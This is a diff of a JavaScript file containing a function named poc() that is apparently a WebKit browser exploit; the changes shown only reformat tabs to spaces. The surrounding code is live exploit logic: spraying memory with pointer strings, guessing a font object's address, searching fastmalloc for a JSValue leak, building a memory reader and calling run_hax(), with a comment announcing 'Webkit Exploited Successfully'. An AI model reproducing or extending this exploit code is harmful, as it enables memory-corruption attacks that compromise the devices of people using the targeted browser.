@@ -77,7 +77,7 @@ function poc() {
     window.ffses = {};
 
     do {
-		
+
         var p_s = ptrToString(NPAGES + 2); // vector.size()
         for (var i = 0; i < NPAGES; i++)
             p_s += ptrToString(guf + i * PAGE_SIZE);
@@ -117,8 +117,8 @@ function poc() {
 
     }
     while (guessed_addr === null);
-	//alert("GUESSED FONT: "+guessed_font+"\nGUESSED ADDR: "+guessed_addr+"\nGUF Val: "+guf+"\nLoop Count: "+round);
-	// alert("Webkit Exploited Successfully !! Launching Payload..");
+    //alert("GUESSED FONT: "+guessed_font+"\nGUESSED ADDR: "+guessed_addr+"\nGUF Val: "+guf+"\nLoop Count: "+round);
+    // alert("Webkit Exploited Successfully !! Launching Payload..");
     var p_s = '';
     p_s += ptrToString(26);
     p_s += ptrToString(guessed_addr);
@@ -184,9 +184,9 @@ function poc() {
     }
 
     var jsvalue_leak = null;
-	Object.defineProperties({}, props);
-	var index = fastmalloc.search(eval("String.fromCharCode(0x42,0x44,0x43,0x41,0,0,254,255)")+"................"+eval("String.fromCharCode(14)"));
-	jsvalue_leak = stringToPtr(fastmalloc, index + 32);
+    Object.defineProperties({}, props);
+    var index = fastmalloc.search(eval("String.fromCharCode(0x42,0x44,0x43,0x41,0,0,254,255)") + "................" + eval("String.fromCharCode(14)"));
+    jsvalue_leak = stringToPtr(fastmalloc, index + 32);
 
     var rd_leak = makeReader(jsvalue_leak, 'ffs4');
     var array256 = stringToPtr(rd_leak, 16); //arrays[256]
@@ -441,5 +441,5 @@ function poc() {
         }
     };
     window.p = prim;
-	run_hax();
+    run_hax();
 }
